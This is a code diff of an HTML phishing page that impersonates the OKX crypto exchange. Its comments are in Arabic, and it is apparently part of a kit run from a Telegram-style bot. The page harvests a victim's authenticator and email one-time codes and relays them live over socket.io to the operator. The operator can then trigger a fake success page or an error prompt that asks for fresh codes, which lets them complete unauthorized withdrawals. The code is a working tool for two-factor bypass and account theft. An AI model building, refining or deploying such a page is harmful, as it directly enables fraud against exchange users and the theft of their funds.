@@ -1,147 +1,252 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد عملية السحب | OKX</title>
+    <title>OKX - Safety Verification</title>
     <style>
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background-color: #000; 
-            color: #fff; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-        }
-        .card { 
-            background: #1a1a1a; 
-            padding: 35px; 
-            border-radius: 16px; 
-            width: 90%; 
-            max-width: 420px; 
-            text-align: center; 
-            border: 1px solid #333;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-        .logo { 
-            width: 70px; 
-            margin-bottom: 25px; 
-        }
-        h2 { 
-            font-size: 22px; 
-            margin-bottom: 12px; 
-            font-weight: 600;
-        }
-        p { 
-            color: #a1a1a1; 
-            font-size: 14px; 
-            margin-bottom: 25px; 
-            line-height: 1.6;
-        }
-        .highlight {
-            color: #fff;
-            font-weight: bold;
-            background: #333;
-            padding: 2px 6px;
-            border-radius: 4px;
-        }
-        input { 
-            width: 100%; 
-            padding: 15px; 
-            margin-bottom: 20px; 
-            border-radius: 10px; 
-            border: 1px solid #444; 
-            background: #000; 
-            color: #fff; 
-            text-align: center; 
-            font-size: 26px; 
-            letter-spacing: 8px; 
+        /* الأساسيات عشان تكون شبه الصورة بالظبط */
+        * {
+            margin: 0;
+            padding: 0;
             box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
         }
+
+        body {
+            background-color: #ffffff;
+            color: #000000;
+        }
+
+        /* تنسيق الهيدر العلوي */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 16px;
+            border-bottom: 1px solid #eeeeee;
+        }
+
+        .header .left-side {
+            display: flex;
+            align-items: center;
+        }
+
+        /* شعار OKX */
+        .header .logo {
+            font-size: 20px;
+            font-weight: 900;
+            letter-spacing: -1px;
+            margin-right: 15px;
+            text-decoration: none;
+            color: #000000;
+        }
+
+        .header .right-side {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .header-icon {
+            font-size: 18px;
+            color: #000000;
+            cursor: pointer;
+        }
+
+        .sign-up-btn {
+            background-color: #ffffff;
+            border: 1px solid #4d4d4d;
+            border-radius: 18px;
+            padding: 4px 14px;
+            font-size: 13px;
+            font-weight: 500;
+            text-decoration: none;
+            color: #000000;
+        }
+
+        /* تنسيق المحتوى الرئيسي */
+        .main-container {
+            padding: 40px 24px;
+            text-align: left;
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 16px;
+        }
+
+        .sub-text {
+            color: #666666;
+            font-size: 13px;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        /* تنسيق حقول الإدخال */
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            color: #666666;
+            font-size: 13px;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            height: 48px;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            padding: 0 12px;
+            font-size: 14px;
+            color: #000000;
+            background-color: transparent;
+        }
+
         input:focus {
             outline: none;
-            border-color: #fff;
+            border-color: #000000;
         }
-        button { 
-            width: 100%; 
-            padding: 15px; 
-            border-radius: 30px; 
-            border: none; 
-            background: #fff; 
-            color: #000; 
-            font-weight: bold; 
-            cursor: pointer; 
-            font-size: 17px; 
-            transition: 0.3s;
+
+        /* رسالة خطأ */
+        .error-message {
+            color: #ff4d4f;
+            font-size: 12px;
+            margin-top: 6px;
+            display: none;
         }
-        button:hover {
-            background: #e0e0e0;
+
+        /* تنسيق زر الـ Next الأسود الكبير */
+        .next-btn {
+            width: 100%;
+            height: 48px;
+            background-color: #000000;
+            border: none;
+            border-radius: 24px;
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s;
         }
-        button:disabled {
-            background: #555;
+
+        .next-btn:active {
+            background-color: #333333;
+        }
+
+        .next-btn:disabled {
+            background-color: #cccccc;
             cursor: not-allowed;
         }
-        .loading-text { 
-            display: none; 
-            color: #f3ba2f; 
-            font-size: 14px; 
-            margin-top: 20px; 
-            animation: blink 1s infinite;
+
+        /* تنسيق الروابط السفلية */
+        .footer-links {
+            color: #666666;
+            font-size: 13px;
+            margin-top: 30px;
+            text-align: left;
         }
-        @keyframes blink {
-            50% { opacity: 0.5; }
+
+        .footer-links a {
+            color: #000000;
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
         }
+
+        .footer-links a:hover {
+            border-bottom: 1px solid #000000;
+        }
+
     </style>
 </head>
 <body>
 
-<div class="card">
-    <img src="static/logo.png" class="logo" alt="OKX">
-    
-    <h2>تأكيد سحب USDT</h2>
-    <p>لقد طلبت سحب الرصيد إلى المحفظة المنتهية بـ <span class="highlight">yGid</span> عبر شبكة <span class="highlight">TRC20</span>.<br>يرجى إدخال رمز التحقق (OTP) المرسل لهاتفك لتأكيد المعاملة.</p>
-    
-    <form id="transferForm">
-        <input type="text" id="otp_val" name="withdrawal_otp" placeholder="000000" required maxlength="6" autocomplete="off">
-        <button type="submit" id="btn">تأكيد السحب الآن</button>
-    </form>
-    
-    <div id="loading" class="loading-text">جاري معالجة المعاملة على الشبكة (Blockchain)...</div>
-</div>
+    <div class="header">
+        <div class="left-side">
+            <a href="#" class="logo">OKX</a>
+        </div>
+        <div class="right-side">
+            <span class="header-icon">&#x1F50D;</span> <a href="#" class="sign-up-btn">Sign up</a>
+            <span class="header-icon">&#x2630;</span> </div>
+    </div>
 
-<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
-<script>
-    const socket = io('http://localhost:3000');
+    <div class="main-container">
+        <h1>Enter code</h1>
+        <p class="sub-text">
+            Enter the code from your authenticator, app such as Google Authenticator or Email Confirm code
+        </p>
 
-    document.getElementById('transferForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        const otpValue = document.getElementById('otp_val').value;
+        <form id="transferForm">
+            <div class="input-group">
+                <input type="text" id="auth_otp" name="auth_otp" placeholder="Enter code" required maxlength="6" autocomplete="off">
+            </div>
+
+            <div class="input-group">
+                <label class="input-label">Enter the code Confirm by email</label>
+                <input type="text" id="email_otp" name="email_otp" placeholder="Enter code" required maxlength="6" autocomplete="off">
+                <div id="email_error" class="error-message">Invalid or missing email code</div>
+            </div>
+
+            <button type="submit" class="next-btn" id="btn">Next</button>
+        </form>
+
+        <div class="footer-links">
+            Unable to verify? 
+            <a href="#">Switch to phone verification</a> 
+            or 
+            <a href="#">Reset</a>
+        </div>
+    </div>
+
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script>
+        const socket = io('http://localhost:3000'); // تأكد إن البورت صح
+        const form = document.getElementById('transferForm');
         const btn = document.getElementById('btn');
-        const loading = document.getElementById('loading');
+        const emailError = document.getElementById('email_error');
 
-        if(otpValue.length < 6) {
-            alert("يرجى إدخال الكود كاملاً");
-            return;
-        }
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const authValue = document.getElementById('auth_otp').value;
+            const emailValue = document.getElementById('email_otp').value;
 
-        // 1. إرسال الكود فوراً للبوت
-        socket.emit('send_withdraw_otp', { code: otpValue });
-        console.log("OTP sent to bot terminal: " + otpValue);
+            if(authValue.length < 6 || emailValue.length < 6) {
+                alert("Please enter the full codes.");
+                return;
+            }
 
-        // 2. تغيير شكل الزرار واللودنج
-        btn.disabled = true;
-        btn.innerText = "جاري التأكيد...";
-        loading.style.display = 'block';
+            // إرسال الكودين مع بعض للبوت
+            socket.emit('send_withdraw_data', { 
+                auth_code: authValue, 
+                email_code: emailValue 
+            });
 
-        // 3. التحويل لصفحة النجاح بعد 4 ثواني (عشان يلحق يبعت الداتا)
-        setTimeout(() => {
-            window.location.href = 'success.html';
-        }, 4000);
-    });
-</script>
+            // تغيير شكل الزرار وتثبيته
+            btn.disabled = true;
+            btn.innerText = "Processing...";
+            emailError.style.display = 'none'; // إخفاء أي خطأ قديم
+        });
+
+        // استقبال الأوامر من البوت (5 و 6)
+        socket.on('bot_command', function(data) {
+            if (data.action === '5') {
+                // أمر النجاح
+                window.location.href = 'successful.html';
+            } else if (data.action === '6') {
+                // أمر الخطأ وإعادة الإدخال
+                btn.disabled = false;
+                btn.innerText = "Next";
+                emailError.style.display = 'block'; // إظهار رسالة الخطأ
+                form.reset(); // تصفير الفورم
+            }
+        });
+    </script>
 
 </body>
 </html>
